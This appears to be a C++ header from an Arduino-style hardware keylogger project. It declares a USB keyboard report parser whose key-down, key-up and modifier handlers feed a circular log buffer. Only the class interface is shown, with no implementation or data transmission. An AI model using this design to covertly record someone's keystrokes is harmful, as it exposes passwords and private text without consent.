#include "CircularBuffer.h"
#include "keylogger.h"
#include <hidboot.h>
#include <usbhub.h>

class USBKeyboardParser : public KeyboardReportParser
{
  public:
    USBKeyboardParser(CircularBuffer<log_entry> *newBuffer);
    void PrintKey(uint8_t mod, uint8_t key);

  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);
    void OnKeyDown  (uint8_t mod, uint8_t key);
    void OnKeyUp  (uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);

  private:
    CircularBuffer<log_entry> *logBuffer;
};
